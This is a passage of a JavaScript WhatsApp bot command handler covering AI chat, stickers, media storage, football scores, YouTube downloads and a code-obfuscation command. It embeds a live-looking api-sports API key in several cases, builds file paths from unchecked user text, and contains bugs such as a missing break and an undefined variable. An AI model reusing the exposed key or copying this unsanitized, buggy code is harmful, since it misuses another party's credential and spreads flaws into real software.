    if (!q) return replygcprexzy(`Example: ${prefix + command} Who is Ronaldo?`);

    try {
        await PrexzyStickWait();
        
        // Use a working OpenAI API or other AI response API
        let response = await fetch(`https://api.ryzendesu.vip/api/ai/claude?text=${encodeURIComponent(q)}`);
        let data = await response.json();

        if (!data || !data.response) throw new Error("Invalid AI response.");
        
        await replygcprexzy(`🤖 *AI Response:*\n\n${data.response}`);

    } catch (error) {
        console.error(error);
        replygcprexzy(`⚠️ AI is unavailable right now. Try again later.`);
    }
}  
break;
    case 'xxqc': {
if (!q) return replygcprexzy(`📌Example: ${prefix + command} pink hallo\n\n꒰ 🖌️ Color List ꒱ ೄྀ࿐ ˊˎ-\n━━━━━━⊱⋆⊰━━━━━━\npink\nblue\nred\ngreen\nyellow\npurple\ndarkblue\nlightblue\nash\norange\nblack\nwhite\nteal\nlightpink\nchocolate\nsalmon\nmagenta\ntan\nwheat\ndeeppink\nfire\nskyblue\nsafron\nbrightskyblue\nhotpink\nlightskyblue\nseagreen\ndarkred\norangered\ncyan\nviolet\nmossgreen\ndarkgreen\nnavyblue\ndarkorange\ndarkpurple\nfuchsia\ndarkmagenta\ndarkgray\npeachpuff\nblackishgreen\ndarkishred\ngoldenrod\ndarkishgray\ndarkishpurple\ngold\nsilver`)
if (text.length > 100) return replygcprexzy(`Max 100 character.`)
let [color, ...message] = text.split(' ');
message = message.join(' ');
let backgroundColor;
switch(color) {
case 'pink':
backgroundColor = '#f68ac9';
break;
case 'blue':
backgroundColor = '#6cace4';
break;
case 'red':
backgroundColor = '#f44336';
break;
case 'green':
backgroundColor = '#4caf50';
break;
case 'yellow':
backgroundColor = '#ffeb3b';
break;
case 'purple':
backgroundColor = '#9c27b0';
break;
case 'darkblue':
backgroundColor = '#0d47a1';
break;
case 'lightblue':
backgroundColor = '#03a9f4'; 
break;
case 'ash':
backgroundColor = '#9e9e9e';
break;
case 'orange':
backgroundColor = '#ff9800';
break;
case 'black':
backgroundColor = '#000000';
break;
case 'white':
backgroundColor = '#ffffff';
break;
case 'teal':
backgroundColor = '#008080';
break;
case 'lightpink':
backgroundColor = '#FFC0CB';
break;
case 'chocolate':
backgroundColor = '#A52A2A';
case 'salmon':
backgroundColor = '#FFA07A'; 
break; 
case 'magenta':
backgroundColor = '#FF00FF'; 
break; 
case 'tan':
backgroundColor = '#D2B48C'; 
break;
case 'wheat':
backgroundColor = '#F5DEB3'; 
break;
case 'deeppink':
backgroundColor = '#FF1493'; 
break; 
case 'fire':
backgroundColor = '#B22222';
break;
case 'skyblue':
backgroundColor = '#00BFFF';
break; 
case 'orange':
backgroundColor = '#FF7F50';
break;
case 'brightskyblue':
backgroundColor = '#1E90FF'; 
break; 
case 'hotpink':
backgroundColor = '#FF69B4'; 
break; 
case 'lightskyblue':
backgroundColor = '#87CEEB'; 
break; 
case 'seagreen':
backgroundColor = '#20B2AA'; 
break; 
case 'darkred':
backgroundColor = '#8B0000'; 
break; 
case 'orangered':
backgroundColor = '#FF4500'; 
break; 
case 'cyan':
backgroundColor = '#48D1CC'; 
break; 
case 'violet':
backgroundColor = '#BA55D3'; 
break; 
case 'mossgreen':
backgroundColor = '#00FF7F'; 
break; 
case 'darkgreen':
backgroundColor = '#008000'; 
break; 
case 'navyblue':
backgroundColor = '#191970'; 
break; 
case 'darkorange':
backgroundColor = '#FF8C00'; 
break; 
case 'darkpurple':
backgroundColor = '#9400D3'; 
break; 
case 'fuchsia':
backgroundColor = '#FF00FF'; 
break; 
case 'darkmagenta':
backgroundColor = '#8B008B'; 
break;
case 'darkgray':
backgroundColor = '#2F4F4F'; 
break;
case 'peachpuff':
backgroundColor = '#FFDAB9'; 
break;
case 'darkishgreen':
backgroundColor = '#BDB76B'; 
break;
case 'darkishred':
backgroundColor = '#DC143C'; 
break;
case 'goldenrod':
backgroundColor = '#DAA520'; 
break;
case 'darkishgray':
backgroundColor = '#696969'; 
break;
case 'darkishpurple':
backgroundColor = '#483D8B'; 
break;
case 'gold':
backgroundColor = '#FFD700'; 
break;
case 'silver':
backgroundColor = '#C0C0C0'; 
break;
default:
return replygcprexzy('The selected color is not available.')
}
let obj = {
type: 'quote',
format: 'png',
backgroundColor,
width: 512,
height: 768,
scale: 2,
messages: [
{
entities: [],
avatar: true,
from: {
id: 1,
name: pushname,
photo: { 
url: await PrexzyVilla.profilePictureUrl(m.sender, "image").catch(() => 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'),
}
},
text: message,
replyMessage: {},
},
],
};
let response = await axios.post('https://bot.lyo.su/quote/generate', obj, {
headers: {
'Content-Type': 'application/json',
},
});
let buffer = Buffer.from(response.data.result.image, 'base64');
PrexzyVilla.sendImageAsSticker(m.chat, buffer, m, { packname: `${global.packname}`, author: `${global.author}`})
}
break
    case 'ephemeral': {
                if (!m.isGroup) return PrexzyStickgroup()
                if (!isBotAdmins) return PrexzyStickBotAdmin()
                if (!isAdmins) return PrexzyStickAdmin()
                if (!text) return replygcprexzy('Enter the value enable/disable')
                if (args[0] === 'on') {
                    await PrexzyVilla.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL })
                    await replygcprexzy(`Done`)
                } else if (args[0] === 'off') {
                    await PrexzyVilla.sendMessage(m.chat, { disappearingMessagesInChat: false })
                    await replygcprexzy(`Done`)
                }
            }
            break
            case 'delete': case 'del': case 'd':{
            	 let key = {}
 try {
 	key.remoteJid = m.quoted ? m.quoted.fakeObj.key.remoteJid : m.key.remoteJid
	key.fromMe = m.quoted ? m.quoted.fakeObj.key.fromMe : m.key.fromMe
	key.id = m.quoted ? m.quoted.fakeObj.key.id : m.key.id
 	key.participant = m.quoted ? m.quoted.fakeObj.participant : m.key.participant
 } catch (e) {
 	console.error(e)
 }
 PrexzyVilla.sendMessage(m.chat, { delete: key })
}
break
    case 'autoswview':
    case 'autostatusview':{
             if (!PrexzyTheCreator) return PrexzyStickOwner()
               if (args.length < 1) return replygcprexzy('on/off?')
               if (args[0] === 'on') {
                  antiswview = true
                  replygcprexzy(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  antiswview = false
                  replygcprexzy(`${command} is disabled`)
               }
            }
            break
    case 'anticall': {
             if (!PrexzyTheCreator) return PrexzyStickOwner()
               if (args.length < 1) return replygcprexzy('on/off?')
               if (args[0] === 'on') {
                  anticall = true
                  replygcprexzy(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  anticall = false
                  replygcprexzy(`${command} is disabled`)
               }
            }
            break
case 'flagquiz': {
    try {
        let response = await fetch('https://restcountries.com/v3.1/all');
        let countries = await response.json();

        if (!countries || countries.length === 0) {
            return replygcprexzy("❌ Unable to fetch country flags. Try again later.");
        }

        let randomCountry = countries[Math.floor(Math.random() * countries.length)];
        let countryName = randomCountry.name.common;
        let flagUrl = randomCountry.flags.svg;

        global.currentFlagQuiz = countryName.toLowerCase(); // Store the correct answer

        PrexzyVilla.sendMessage(m.chat, {
            image: { url: flagUrl },
            caption: `🌍 *FLAG QUIZ!* 🌍\n\n🧐 *Guess the country of this flag!*\n💡 Reply with your answer using: ${prefix}flaganswer <country name>\n\nDONE BY QUEEN NYX 👑`
        }, { quoted: m });

    } catch (error) {
        console.error(error);
        replygcprexzy("❌ Error fetching flag quiz. Try again later.\n\nDONE BY QUEEN NYX 👑");
    }
}
break

case 'flaganswer': { // Changed from 'answer' to 'flaganswer'
    if (!global.currentFlagQuiz) return replygcprexzy("❌ No flag quiz is currently active! Use *flagquiz* to start a new one.");
    if (!text) return replygcprexzy("⚠️ Please provide a country name!");

    let userAnswer = text.toLowerCase();
    let correctAnswer = global.currentFlagQuiz;

    if (userAnswer === correctAnswer) {
        replygcprexzy(`✅ *Correct!* 🎉 The country is *${correctAnswer}*!\n\nDONE BY QUEEN NYX 👑`);
        global.currentFlagQuiz = null; // Reset quiz
    } else {
        replygcprexzy(`❌ *Wrong!* Try again, or type *flagquiz* for a new flag.`);
    }
}
break
case 'addvideo':{
if (!PrexzyTheCreator) return PrexzyStickOwner()
if (args.length < 1) return replygcprexzy('Whats the video name?')
if (VideoPrexzy.includes(q)) return replygcprexzy("The name is already in use")
let delb = await PrexzyVilla.downloadAndSaveMediaMessage(quoted)
VideoPrexzy.push(q)
await fsx.copy(delb, `./PrexzyMedia/video/${q}.mp4`)
fs.writeFileSync('./PrexzyMedia/database/prexzyvideo.json', JSON.stringify(VideoPrexzy))
fs.unlinkSync(delb)
replygcprexzy(`Success Adding Video\nCheck by typing ${prefix}listvideo`)
}
break
case 'delvideo':{
if (!PrexzyTheCreator) return PrexzyStickOwner()
if (args.length < 1) return replygcprexzy('Enter the video name')
if (!VideoPrexzy.includes(q)) return replygcprexzy("The name does not exist in the database")
let wanu = VideoPrexzy.indexOf(q)
VideoPrexzy.splice(wanu, 1)
fs.writeFileSync('./PrexzyMedia/database/prexzyvideo.json', JSON.stringify(VideoPrexzy))
fs.unlinkSync(`./PrexzyMedia/video/${q}.mp4`)
replygcprexzy(`Success deleting video ${q}`)
}
break
case 'listvideo':{
let teks = '┌──⭓「 *Video List* 」\n│\n'
for (let x of VideoPrexzy) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${VideoPrexzy.length}*`
replygcprexzy(teks)
}
break
case 'addimage':{
if (!PrexzyTheCreator) return PrexzyStickOwner()
if (args.length < 1) return replygcprexzy('Whats the image name?')
if (ImagePrexzy.includes(q)) return replygcprexzy("The name is already in use")
let delb = await PrexzyVilla.downloadAndSaveMediaMessage(quoted)
ImagePrexzy.push(q)
await fsx.copy(delb, `./PrexzyMedia/image/${q}.jpg`)
fs.writeFileSync('./PrexzyMedia/database/prexzyimage.json', JSON.stringify(ImagePrexzy))
fs.unlinkSync(delb)
replygcprexzy(`Success Adding Image\nCheck by typing ${prefix}listimage`)
}
break
case 'delimage':{
if (!PrexzyTheCreator) return PrexzyStickOwner()
if (args.length < 1) return replygcprexzy('Enter the image name')
if (!ImagePrexzy.includes(q)) return replygcprexzy("The name does not exist in the database")
let wanu = ImagePrexzy.indexOf(q)
ImagePrexzy.splice(wanu, 1)
fs.writeFileSync('./PrexzyMedia/database/prexzyimage.json', JSON.stringify(ImagePrexzy))
fs.unlinkSync(`./PrexzyMedia/image/${q}.jpg`)
replygcprexzy(`Success deleting image ${q}`)
}
break
case 'listimage':{
let teks = '┌──⭓「 *Image List* 」\n│\n'
for (let x of ImagePrexzy) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${ImagePrexzy.length}*`
replygcprexzy(teks)
}
break
case 'addsticker':{
if (!PrexzyTheCreator) return PrexzyStickOwner()
if (args.length < 1) return replygcprexzy('Whats the sticker name?')
if (StickerPrexzy.includes(q)) return replygcprexzy("The name is already in use")
let delb = await PrexzyVilla.downloadAndSaveMediaMessage(quoted)
StickerPrexzy.push(q)
await fsx.copy(delb, `./PrexzyMedia/sticker/${q}.webp`)
fs.writeFileSync('./PrexzyMedia/database/prexzysticker.json', JSON.stringify(StickerPrexzy))
fs.unlinkSync(delb)
replygcprexzy(`Success Adding Sticker\nCheck by typing ${prefix}liststicker`)
}
break
case 'delsticker':{
if (!PrexzyTheCreator) return PrexzyStickOwner()
if (args.length < 1) return replygcprexzy('Enter the sticker name')
if (!StickerPrexzy.includes(q)) return replygcprexzy("The name does not exist in the database")
let wanu = StickerPrexzy.indexOf(q)
StickerPrexzy.splice(wanu, 1)
fs.writeFileSync('./PrexzyMedia/database/prexzysticker.json', JSON.stringify(StickerPrexzy))
fs.unlinkSync(`./PrexzyMedia/sticker/${q}.webp`)
replygcprexzy(`Success deleting sticker ${q}`)
}
break
case 'liststicker':{
let teks = '┌──⭓「 *Sticker List* 」\n│\n'
for (let x of StickerPrexzy) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${StickerPrexzy.length}*`
replygcprexzy(teks)
}
break
case 'livescore': {
    let apiKey = 'd4fdb3cfcdb511ff1b0898d07831732d';
    let apiUrl = `https://v3.football.api-sports.io/fixtures?live=all`;

    try {
        let response = await fetch(apiUrl, { headers: { 'x-apisports-key': apiKey } });
        let data = await response.json();

        if (!data.response || data.response.length === 0) {
            return replygcprexzy(`❌ No live matches at the moment.`);
        }

        let matches = data.response.map(match => 
            `⚽ *${match.teams.home.name}* vs *${match.teams.away.name}*\n🔢 *Score:* ${match.goals.home} - ${match.goals.away}\n⏳ *Time:* ${match.fixture.status.elapsed} min`
        ).join("\n\n");

        replygcprexzy(`🏆 *LIVE MATCH SCORES* 🏆\n\n${matches}\n\nDONE BY QUEEN NYX 👑`);
    } catch (error) {
        replygcprexzy(`❌ Error fetching live scores. Try again later.\n\nDONE BY QUEEN NYX 👑`);
    }
}
break
case 'upcoming': {
    let apiKey = 'd4fdb3cfcdb511ff1b0898d07831732d';
    let tomorrow = new Date();
    tomorrow.setDate(tomorrow.getDate() + 1);
    let date = tomorrow.toISOString().split('T')[0];

    let apiUrl = `https://v3.football.api-sports.io/fixtures?date=${date}`;

    try {
        let response = await fetch(apiUrl, { headers: { 'x-apisports-key': apiKey } });
        let data = await response.json();

        if (!data.response || data.response.length === 0) {
            return replygcprexzy(`❌ No matches scheduled for tomorrow.`);
        }

        let matches = data.response.map(match => 
            `🏟 *${match.league.name}*\n⚽ *${match.teams.home.name}* vs *${match.teams.away.name}*\n🕒 *Time:* ${match.fixture.date.split('T')[1].substring(0, 5)} UTC`
        ).join("\n\n");

        replygcprexzy(`📅 *UPCOMING MATCHES* 📅\n\n${matches}\n\nDONE BY QUEEN NYX 👑`);
    } catch (error) {
        replygcprexzy(`❌ Error fetching upcoming matches. Try again later.\n\nDONE BY QUEEN NYX 👑`);
    }
}
break
case 'addmsg': {
	if (!PrexzyTheCreator) return PrexzyStickOwner()
                if (!m.quoted) return replygcprexzy('Reply Message You Want To Save In Database')
                if (!text) return replygcprexzy(`Example : ${prefix + command} filename`)
                let msgs = global.db.data.database
                if (text.toLowerCase() in msgs) return replygcprexzy(`'${text}' registered in the message list`)
                msgs[text.toLowerCase()] = quoted.fakeObj
replygcprexzy(`Successfully added message in message list as '${text}'
    
Access with ${prefix}getmsg ${text}

View list of Messages With ${prefix}listmsg`)
            }
            break
            case 'getmsg': {
                if (!text) return replygcprexzy(`Example : ${prefix + command} file name\n\nView list of messages with ${prefix}listmsg`)
                let msgs = global.db.data.database
                if (!(text.toLowerCase() in msgs)) return replygcprexzy(`'${text}' not listed in the message list`)
                PrexzyVilla.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
            case 'listmsg': {
                let msgs = JSON.parse(fs.readFileSync('./src/database.json'))
	        let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = ' DATABASE LIST \n\n'
		for (let i of seplit) {
		    teks += `${themeemoji} *Name :* ${i.nama}\n${themeemoji} *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
	        }
	        replygcprexzy(teks)
	    }
	    break 
	case 'delmsg': case 'deletemsg': {
		if (!PrexzyTheCreator) return PrexzyStickOwner()
	        let msgs = global.db.data.database
	        if (!(text.toLowerCase() in msgs)) return replygcprexzy(`'${text}' not listed in the message list`)
		delete msgs[text.toLowerCase()]
		replygcprexzy(`Successfully deleted '${text}' from the message list`)
            }
	    break
case 'addvn':{
if (!PrexzyTheCreator) return PrexzyStickOwner()
if (args.length < 1) return replygcprexzy('Whats the audio name?')
if (VoiceNotePrexzy.includes(q)) return replygcprexzy("The name is already in use")
let delb = await PrexzyVilla.downloadAndSaveMediaMessage(quoted)
VoiceNotePrexzy.push(q)
await fsx.copy(delb, `./PrexzyMedia/audio/${q}.mp3`)
fs.writeFileSync('./PrexzyMedia/database/prexzyvn.json', JSON.stringify(VoiceNotePrexzy))
fs.unlinkSync(delb)
replygcprexzy(`Success Adding Audio\nCheck by typing ${prefix}listvn`)
}
break
case 'delvn':{
if (!PrexzyTheCreator) return PrexzyStickOwner()
if (args.length < 1) return replygcprexzy('Enter the vn name')
if (!VoiceNotePrexzy.includes(q)) return replygcprexzy("The name does not exist in the database")
let wanu = VoiceNotePrexzy.indexOf(q)
VoiceNotePrexzy.splice(wanu, 1)
fs.writeFileSync('./PrexzyMedia/database/prexzyvn.json', JSON.stringify(VoiceNotePrexzy))
fs.unlinkSync(`./PrexzyMedia/audio/${q}.mp3`)
replygcprexzy(`Success deleting vn ${q}`)
}
break
case 'listvn':{
let teks = '┌──⭓「 *VN List* 」\n│\n'
for (let x of VoiceNotePrexzy) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${VoiceNotePrexzy.length}*`
replygcprexzy(teks)
}
break
case 'addzip':{
if (!PrexzyTheCreator) return PrexzyStickOwner()

if (args.length < 1) return replygcprexzy(`What's the zip name?`)
let teks = `${text}`
{
if (ZipPrexzy.includes(teks)) return replygcprexzy("This name is already in use")
let delb = await PrexzyVilla.downloadAndSaveMediaMessage(quoted)
ZipPrexzy.push(teks)
await fsx.copy(delb, `./PrexzyMedia/zip/${teks}.zip`)
fs.writeFileSync('./PrexzyMedia/database/zip.json', JSON.stringify(ZipPrexzy))
fs.unlinkSync(delb)
replygcprexzy(`Success Adding zip\nTo check type ${prefix}listzip`)
}
}
break
case 'delzip':{
if (!PrexzyTheCreator) return PrexzyStickOwner()

if (args.length < 1) return replygcprexzy('Enter the text in the zip list')
let teks = `${text}`
{
if (!ZipPrexzy.includes(teks)) return replygcprexzy("This name does not exist in the database")
let wanu = ZipPrexzy.indexOf(teks)
ZipPrexzy.splice(wanu, 1)
fs.writeFileSync('./PrexzyMedia/database/zip.json', JSON.stringify(ZipPrexzy))
fs.unlinkSync(`./PrexzyMedia/zip/${teks}.zip`)
replygcprexzy(`Successfully deleted zip ${teks}`)
}
}
break
case 'listzip': {

let teksooooo = '┌──⭓「 *ZIP LIST* 」\n│\n'
for (let x of ZipPrexzy) {
teksooooo += `│⭔ ${x}\n`
}
teksooooo += `│\n└────────────⭓\n\n*Total : ${ZipPrexzy.length}*`
replygcprexzy(teksooooo)
}
break
case 'addapk':{
if (!PrexzyTheCreator) return PrexzyStickOwner()

if (args.length < 1) return replygcprexzy('What is the name of the apk?')
let teks = `${text}`
{
if (ApkPrexzy.includes(teks)) return replygcprexzy("This name is already in use")
let delb = await PrexzyVilla.downloadAndSaveMediaMessage(quoted)
apknye.push(teks)
await fsx.copy(delb, `./PrexzyMedia/apk/${teks}.apk`)
fs.writeFileSync('./PrexzyMedia/database/apk.json', JSON.stringify(ApkPrexzy))
fs.unlinkSync(delb)
replygcprexzy(`Successful Adding apk\nTo Check type ${prefix}listapk`)
}
}
break
case 'delapk':{
if (!PrexzyTheCreator) return PrexzyStickOwner()

if (args.length < 1) return replygcprexzy('Name of the apk?')
let teks = `${text}`
{
if (!ApkPrexzy.includes(teks)) return replygcprexzy("This name does not exist in the database")
let wanu = ApkPrexzy.indexOf(teks)
ApkPrexzy.splice(wanu, 1)
fs.writeFileSync('./PrexzyMedia/database/apk.json', JSON.stringify(ApkPrexzy))
fs.unlinkSync(`./PrexzyMedia/apk/${teks}.apk`)
replygcprexzy(`Successfully deleted Apk ${teks}`)
}
}
break
case 'livematch': {
    let apiKey = 'd4fdb3cfcdb511ff1b0898d07831732d'; // Your API key
    let apiUrl = `https://v3.football.api-sports.io/fixtures?live=all`;

    try {
        let response = await fetch(apiUrl, {
            headers: { 'x-apisports-key': apiKey }
        });
        let data = await response.json();

        if (!data.response || data.response.length === 0) {
            return replygcprexzy(`❌ No live matches are happening right now.`);
        }

        let matches = data.response.slice(0, 5).map(match => {
            return `⚽ *${match.teams.home.name}* vs *${match.teams.away.name}*\n🏟 *Stadium:* ${match.fixture.venue.name || "Unknown"}\n⏳ *Time:* ${match.fixture.status.elapsed} min\n🔢 *Score:* ${match.goals.home ?? 0} - ${match.goals.away ?? 0}`;
        }).join("\n\n");

        replygcprexzy(`🏆 *LIVE FOOTBALL MATCHES* 🏆\n\n${matches}\n\nDONE BY QUEEN NYX 👑`);

    } catch (error) {
        console.error(error);
        replygcprexzy(`❌ Error fetching live matches. Try again later.\n\nDONE BY QUEEN NYX 👑`);
    }
}
break
case 'listapk': {

let teksoooooo = '┌──⭓「 *APK LIST* 」\n│\n'
for (let x of ApkPrexzy) {
teksoooooo += `│⭔ ${x}\n`
}
teksoooooo += `│\n└────────────⭓\n\n*Total : ${ApkPrexzy.length}`
replygcprexzy(teksoooooo)
}
break
case 'addpdf':{
if (!PrexzyTheCreator) return PrexzyStickOwner()

if (args.length < 1) return replygcprexzy('What is the name of the pdf')
let teks = `${text}`
{
if (DocPrexzy.includes(teks)) return replygcprexzy("This name is already in use")
let delb = await PrexzyVilla.downloadAndSaveMediaMessage(quoted)
DocPrexzy.push(teks)
await fsx.copy(delb, `./PrexzyMedia/doc/${teks}.pdf`)
fs.writeFileSync('./PrexzyMedia/database/doc.json', JSON.stringify(DocPrexzy))
fs.unlinkSync(delb)
replygcprexzy(`Successful Adding Pdf\nTo check type ${prefix}listpdf`)
}
}
break
case 'delpdf':{
if (!PrexzyTheCreator) return PrexzyStickOwner()

if (args.length < 1) return replygcprexzy('Enter the name')
let teks = `${text}`
{
if (!DocPrexzy.includes(teks)) return replygcprexzy("This name does not exist in the database")
let wanu = DocPrexzy.indexOf(teks)
DocPrexzy.splice(wanu, 1)
fs.writeFileSync('./PrexzyMedia/database/doc.json', JSON.stringify(DocPrexzy))
fs.unlinkSync(`./PrexzyMedia/doc/${teks}.pdf`)
replygcprexzy(`Successfully deleted pdf ${teks}`)
}
}
break
case 'listpdf': {

let teksoooo = '┌──⭓「 *PDF LIST* 」\n│\n'
for (let x of DocPrexzy) {
teksoooo += `│⭔ ${x}\n`
}
teksoooo += `│\n└────────────⭓\n\n*Total : ${DocPrexzy.length}*`
replygcprexzy(teksoooo)
}
break
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
PrexzyVilla_dev = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await PrexzyVilla.sendMessage(m.chat, { audio: PrexzyVilla_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
break
case 'friend':
case 'searchfriend':{
await PrexzyStickWait()
let teman = pickRandom(prexzyverifieduser)
setTimeout(() => {
}, 1000)
setTimeout(() => {
replygcprexzy('Managed to Get One Person')
}, 5000)
setTimeout(() => {
PrexzyVilla.sendMessage(from, {text: `Here @${teman.split("@")[0]}`, mentions: [teman]}, { quoted : m })
}, 9000)
}
break
case 'q': case 'quoted': {
if (!m.quoted) return replygcprexzy('Reply the Message!!')
let prexzyquotx= await PrexzyVilla.serializeM(await m.getQuotedObj())
if (!prexzyquotx.quoted) return replygcprexzy('The message you are replying to is not sent by the bot')
await prexzyquotx.quoted.copyNForward(m.chat, true)
}
break
case 'obfus': case 'obfuscate':{
if (!q) return replygcprexzy(`Example ${prefix+command} const nyxbot = require('baileys')`)
let meg = await obfus(q)
replygcprexzy(`Success
${meg.result}`)
}
break
case 'style': case 'styletext': {
		let { styletext } = require('./lib/scraper')
		if (!text) return replygcprexzy('Enter Query text!')
                let anu = await styletext(text)
                let teks = `Style Text From ${text}\n\n`
                for (let i of anu) {
                    teks += `${themeemoji} *${i.name}* : ${i.result}\n\n`
                }
                replygcprexzy(teks)
	    }
	    break
	    case 'aihauntedstory': {
    if (!text) return replygcprexzy(`Example: ${prefix + command} abandoned hospital`);

    let apiUrl = `https://api.aihaunted.com/generate?topic=${encodeURIComponent(text)}`;
    let response = await fetch(apiUrl);
    let data = await response.json();

    if (!data || !data.story) return replygcprexzy("❌ Unable to generate a horror story.");

    let responseMessage = `👻 *AI-Generated Haunted Story* 👻\n\n🕷️ *Story Topic:* ${text}\n📖 *Story:* ${data.story}\n\nDONE BY QUEEN NYX 👑`;

    replygcprexzy(responseMessage);
}
break
case 'yts': case 'ytsearch': {
                if (!text) return replygcprexzy(`Example : ${prefix + command} story wa anime`)
                let yts = require("yt-search")
                let search = await yts(text)
                let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
                let no = 1
                for (let i of search.all) {
                    teks += `${themeemoji} No : ${no++}\n${themeemoji} Type : ${i.type}\n${themeemoji} Video ID : ${i.videoId}\n${themeemoji} Title : ${i.title}\n${themeemoji} Views : ${i.views}\n${themeemoji} Duration : ${i.timestamp}\n${themeemoji} Uploaded : ${i.ago}\n${themeemoji} Url : ${i.url}\n\n─────────────────\n\n`
                }
                PrexzyVilla.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
            }
            break
            case 'ytmp3': {
    if (!text) return replygcprexzy(`Example: ${prefix + command} https://www.youtube.com/watch?v=xxxxxxx`);

    try {
        const response = await axios.get(`https://ytdl.axeel.my.id/api/download/audio/?url=${text}`);

        if (!response.data || !response.data.metadata) {
            return replygcprexzy(`❌ Failed to fetch YouTube audio. Check your link!`);
        }

        const { metadata, downloads } = response.data;
        const thumbnailUrl = metadata.thumbnail.url;

        await PrexzyVilla.sendMessage(m.chat, {
            image: { url: thumbnailUrl },
            caption: `🎵 *Title:* ${metadata.title}\n🎤 *Artist:* ${metadata.author}\n🔗 *Download Link:* ${downloads.url}\n\nDONE BY QUEEN NYX 👑`
        }, { quoted: m });

        await PrexzyVilla.sendMessage(m.chat, {
            audio: { url: downloads.url },
            mimetype: "audio/mpeg",
            fileName: `${metadata.title}.mp3`
        }, { quoted: m });

    } catch (err) {
        console.error(err);
        replygcprexzy(`❌ Error fetching YouTube MP3. Try again later.\n\nDONE BY QUEEN NYX 👑`);
    }
}
break
case 'play': {
    if (!text) return replygcprexzy(`📌 *Example Usage:*\n${prefix + command} Money by Teni`);

    try {
        replygcprexzy('🔍 *Searching for song...*');

        let search = await yts(text);
        if (!search || search.all.length === 0) throw "❌ *No results found!*";

        let result = search.all[0]; // Get the first search result
        let songTitle = result.title;
        let songUrl = result.url;
        let thumbnail = result.thumbnail;
        let videoId = result.videoId;

        let downloadUrl = `https://ytdl.tiodevhost.my.id/audio/${videoId}`; // Working YouTube MP3 API

        // Fetch the MP3 file
        let audioBuffer = await axios({
            method: 'GET',
            url: downloadUrl,
            responseType: 'arraybuffer'
        }).then(res => res.data);

        let fileName = `${songTitle}.mp3`;
        let filePath = `./temp/${fileName}`;

        // Save the MP3 file temporarily
        fs.writeFileSync(filePath, audioBuffer);

        let message = `🎵 *YouTube Play*\n\n`;
        message += `📌 *Title:* ${songTitle}\n`;
        message += `🔗 *URL:* ${songUrl}\n\n`;
        message += `✅ *DONE BY QUEEN NYX 👑*`;

        // Send the MP3 file
        await PrexzyVilla.sendMessage(m.chat, {
            audio: fs.readFileSync(filePath),
            mimetype: 'audio/mpeg',
            fileName: fileName,
            caption: message
        }, { quoted: m });

        // Delete the file after sending
        fs.unlinkSync(filePath);

    } catch (error) {
        console.error(error);
        replygcprexzy("❌ *Error downloading the song. Please try again later.*\n\n✅ *DONE BY QUEEN NYX 👑*");
    }
}
break
case 'ytmp4': {
    if (!text) return replygcprexzy(`Example: ${prefix + command} https://www.youtube.com/watch?v=xxxxxxx`);

    try {
        const response = await axios.get(`https://ytdl.axeel.my.id/api/download/video/?url=${text}`);

